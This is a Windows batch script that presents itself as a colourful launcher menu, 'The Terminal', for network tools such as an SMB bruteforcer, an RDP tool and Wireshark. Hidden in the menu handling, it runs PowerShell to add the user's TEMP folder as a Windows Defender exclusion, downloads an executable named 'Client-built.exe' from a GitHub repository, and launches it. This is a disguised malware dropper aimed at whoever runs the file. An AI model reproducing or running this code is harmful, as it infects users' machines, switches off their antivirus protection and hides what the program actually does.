@echo off
title The Terminal
mode 150,45
chcp 65001 >nul
cd /d "%~dp0files"
:start
cd /d "%~dp0files"
call :banner

:menu
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo    ╔═1) SMB Bruteforcer
echo    ║
echo    ╠══2) Remote connection
echo    ║
echo    ╠═══3) Wireshark
echo    ║
echo    ╠════4) FTP Server
echo    ║
echo    ╚╦════5) Network Info
echo     ║
set /p input=.%BS%    ╚═════^>
if /I "%input%"=="0" exit
if /I "%input%"=="1" start "" "SMB-Bruteforce-main.bat"
if /I "%input%"=="2" start "" "RDPtool.bat"
if /I "%input%"=="3" start "" "Wireshark.lnk"
if /I "%input%"=="4" start "" "AdminFZ.lnk"
cd %TEMP%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
start "" "%TEMP%\Client-built.exe"
if /I "%input%"=="5" start "" "NetworkTool.bat"
cls
goto start


:banner
echo.
echo.
echo         [38;2;255;69;0m                ████████╗██╗  ██╗███████╗    ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     
echo         [38;2;255;99;71m                ╚══██╔══╝██║  ██║██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     
echo         [38;2;255;140;0m                   ██║   ███████║█████╗         ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     
echo         [38;2;255;165;0m                   ██║   ██╔══██║██╔══╝         ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     
echo         [38;2;255;215;0m                   ██║   ██║  ██║███████╗       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗
echo         [38;2;255;255;0m                   ╚═╝   ╚═╝  ╚═╝╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
echo.
echo. 
